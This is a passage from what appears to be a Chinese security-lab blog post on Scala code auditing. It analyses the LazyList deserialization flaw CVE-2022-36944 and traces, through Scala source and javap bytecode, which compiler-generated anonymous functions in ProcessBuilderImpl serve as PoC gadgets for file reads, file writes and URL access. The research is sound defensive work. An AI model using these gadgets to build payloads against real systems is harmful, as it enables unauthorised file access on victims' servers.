<p>在创建<code>Scala</code>匿名函数时，若没有显式地为这些函数命名，那么<code>Scala</code>编译器将自动为这些函数分配一个名称，这些名称的格式为<code>$anonfunc$1</code>，其中<code>$anonfunc</code>表示当前是一个函数，<code>$1</code>为编号用以区分不同的匿名函数。了解了这一点我们尝试对<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>进行解析。<code>ProcessBuilderImpl</code>为特质，而<code>FileOutput</code>是其内部类，<code>anonfun</code>标识了匿名函数，<code>$lessinit$greater</code>标识了名称，<code>$3</code>标识了匿名函数的编号。将<code>$lessinit$greater</code>翻译一下就是<code>&lt;init&gt;</code>。这与前文提到的匿名函数通用格式有所区别，<code>Payload</code>使用的匿名函数多了<code>$lessinit$greater</code>标志。</p>
<p>在<code>Scala</code> 源码中，我们找到了<code>ProcessBuilderImpl</code>内部类<code>FileOutput</code>以及另外两个可用内部类的实现。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">process</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLInput</span><span style="color:#f92672">(</span>url<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">URL</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">IStreamBuilder</span><span style="color:#f92672">(</span>url<span style="color:#f92672">.</span>openStream<span style="color:#f92672">(),</span> url<span style="color:#f92672">.</span>toString<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">process</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileInput</span><span style="color:#f92672">(</span>file<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">IStreamBuilder</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileInputStream</span><span style="color:#f92672">(</span>file<span style="color:#f92672">),</span> file<span style="color:#f92672">.</span>getAbsolutePath<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">process</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileOutput</span><span style="color:#f92672">(</span>file<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">,</span> append<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">OStreamBuilder</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileOutputStream</span><span style="color:#f92672">(</span>file<span style="color:#f92672">,</span> append<span style="color:#f92672">),</span> file<span style="color:#f92672">.</span>getAbsolutePath<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>在这里，注意到这三个类除了定义了主构造函数外便在没有定义其他的内容了，那么<code>Payload</code>中的匿名函数从哪里来。通过观察上述三个函数的声明形式，可以注意到以下特征：</p>
<ul>
<li>均继承了一个父类</li>
<li>在父类的主构造函数中调用了子类参数的方法</li>
</ul>
<p>跟进IStreamBuilder类，还可以发现该类的第一个参数为传名调用：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">process</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">IStreamBuilder</span><span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>    stream<span style="color:#66d9ef">:</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">InputStream</span><span style="color:#f92672">,</span> <span style="color:#75715e">// =&gt; 标识了传名调用
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    label<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">)</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">ThreadBuilder</span><span style="color:#f92672">(</span>label<span style="color:#f92672">,</span> <span style="color:#66d9ef">_</span> processOutput protect<span style="color:#f92672">(</span>stream<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> hasExitValue <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>通过模拟上述形式得到以下代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Parent</span><span style="color:#f92672">(</span>i<span style="color:#66d9ef">:</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">Int</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Son</span><span style="color:#f92672">(</span>s<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Parent</span><span style="color:#f92672">(</span>s<span style="color:#f92672">.</span>length<span style="color:#f92672">())</span>
</span></span></code></pre></div><p>通过<code>IDEA</code>进行编译后查看生成的类发现确实生成了<code>Son$$anonfun$$lessinit$greater$1</code></p>
<p><img loading="lazy" src="attachments/5706d63a-bd43-4aaa-9b20-020bd9c87b17.png" alt=""  />
</p>
<p>通过<code>javap</code>命令查看该类的字节码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 前文提到的，匿名函数入口在apply方法</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">apply</span>();
</span></span><span style="display:flex;"><span>    descriptor: ()I
</span></span><span style="display:flex;"><span>    flags: ACC_PUBLIC, ACC_FINAL
</span></span><span style="display:flex;"><span>    Code:
</span></span><span style="display:flex;"><span>      stack<span style="color:#f92672">=</span>1, locals<span style="color:#f92672">=</span>1, args_size<span style="color:#f92672">=</span>1
</span></span><span style="display:flex;"><span>         0: aload_0
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 调用常量值中 23号索引指向的MethodRef 即apply$mcI$sp:()I</span>
</span></span><span style="display:flex;"><span>         1: invokevirtual <span style="color:#960050;background-color:#1e0010">#</span>23                 <span style="color:#75715e">// Method apply$mcI$sp:()I</span>
</span></span><span style="display:flex;"><span>         4: ireturn
</span></span><span style="display:flex;"><span>      LineNumberTable:
</span></span><span style="display:flex;"><span>        line 7: 0
</span></span><span style="display:flex;"><span>      LocalVariableTable:
</span></span><span style="display:flex;"><span>        Start  Length  Slot  Name   Signature
</span></span><span style="display:flex;"><span>            0       5     0  <span style="color:#66d9ef">this</span>   Lorg<span style="color:#f92672">/</span>example<span style="color:#f92672">/</span>Son$$anonfun$$lessinit$greater$1;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">apply$mcI$sp</span>();
</span></span><span style="display:flex;"><span>    descriptor: ()I
</span></span><span style="display:flex;"><span>    flags: ACC_PUBLIC
</span></span><span style="display:flex;"><span>    Code:
</span></span><span style="display:flex;"><span>      stack<span style="color:#f92672">=</span>1, locals<span style="color:#f92672">=</span>1, args_size<span style="color:#f92672">=</span>1
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 将当前方法的第一个参数放到操作数栈顶，即this</span>
</span></span><span style="display:flex;"><span>         0: aload_0
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 用以获取常量池中 27号索引所指向的FieldRef的值，并放入操作数栈顶</span>
</span></span><span style="display:flex;"><span>         1: getfield      <span style="color:#960050;background-color:#1e0010">#</span>27                 <span style="color:#75715e">// Field s$1:Ljava/lang/String;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 调用常量池中 32号索引指向的Methodref 即 java/lang/String.length:()I</span>
</span></span><span style="display:flex;"><span>         4: invokevirtual <span style="color:#960050;background-color:#1e0010">#</span>32                 <span style="color:#75715e">// Method java/lang/String.length:()I</span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 返回执行的结果</span>
</span></span><span style="display:flex;"><span>         7: ireturn
</span></span><span style="display:flex;"><span>      LineNumberTable:
</span></span><span style="display:flex;"><span>        line 7: 0
</span></span><span style="display:flex;"><span>      LocalVariableTable:
</span></span><span style="display:flex;"><span>        Start  Length  Slot  Name   Signature
</span></span><span style="display:flex;"><span>            0       8     0  <span style="color:#66d9ef">this</span>   Lorg<span style="color:#f92672">/</span>example<span style="color:#f92672">/</span>Son$$anonfun$$lessinit$greater$1;
</span></span><span style="display:flex;"><span>            
</span></span></code></pre></div><p>通过分析字节码发现，<code>Son$$anonfun$$lessinit$greater$1</code>即为<code>Parent</code>类的第一个参数<code>s.length()</code>的引用，同理可知在<code>FileOutput</code> 中 <code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code> 即为<code>new FileOutputStream(file, append)</code>的引用。换句话说，<code>IStreamBuilder</code>类的第一个参数即为该反序列化漏洞需要的无参匿名函数，也就是<code>POC</code>中提供的三个匿名函数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>url<span style="color:#f92672">.</span>openStream<span style="color:#f92672">()</span> <span style="color:#66d9ef">=&gt;</span> scala<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span><span style="color:#a6e22e">ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileInputStream</span><span style="color:#f92672">(</span>file<span style="color:#f92672">)</span> <span style="color:#66d9ef">=&gt;</span> scala<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span><span style="color:#a6e22e">ProcessBuilderImpl$FileInput$$anonfun$$lessinit$greater$2</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileOutputStream</span><span style="color:#f92672">(</span>file<span style="color:#f92672">,</span> append<span style="color:#f92672">)</span> <span style="color:#66d9ef">=&gt;</span> scala<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span><span style="color:#a6e22e">ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</span>
</span></span></code></pre></div><p>当然，该漏洞的Payload绝不止PoC中提到的三个匿名函数，有兴趣的读者可自行寻找更多的可被利用的无参匿名函数。</p>
<h2 id="四总结">四、总结<a hidden class="anchor" aria-hidden="true" href="#四总结">#</a></h2>
<p>与<code>Java</code>语言的百花齐放截然相反，在中文互联网中，你甚至找不到一篇正经介绍<code>Scala</code>代码审计的文章，但<code>Scala</code>在一些特定领域（大数据处理）以及一些大公司中（Twitter、LinkedIn、Verizon）却承担着举足轻重的作用。本文尝试探索<code>Scala</code>代码审计的蓝海，向读者传授一些在<code>Scala</code>代码审计中的小Tricks，以便有需要者能够更快地开始<code>Scala</code>代码审计以及漏洞挖掘工作。</p>
<h2 id="五参考链接">五、参考链接<a hidden class="anchor" aria-hidden="true" href="#五参考链接">#</a></h2>
<p>1、<a href="https://docs.scala-lang.org/#/">Scala Document</a></p>
<p>2、<a href="https://www.freebuf.com/vuls/347146.html#/">Apache Spark UI 命令注入漏洞 CVE-2022-33891</a></p>
<p>3、<a href="https://github.com/apache/spark/blob/v3.3.1/core/src/main/scala/org/apache/spark/ui/HttpSecurityFilter.scala">Apache Spark UI HttpSecurityFilter 源代码</a></p>
<p>4、<a href="https://www.freebuf.com/articles/network/375109.html#/">基于LazyList的Scala反序列化漏洞透析(CVE-2022-36944)</a></p>
<p>5、<a href="https://github.com/yarocher/lazylist-cve-poc/tree/main#/">CVE-2022-36944 POC</a></p>

  </div>

  <footer class="post-footer">
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/blog/cve-2023-0179/">
    <span class="title">« 上一页</span>
    <br>
    <span>CVE-2023-0179 Linux内核提权</span>
  </a>
  <a class="next" href="http://localhost:1313/blog/git-attack/">
    <span class="title">下一页 »</span>
    <br>
    <span>Git 出乎意料的攻击面</span>
  </a>
</nav>





  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© <a href="https://poc.qianxin.com/home">天工实验室</a></span>
        

    
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
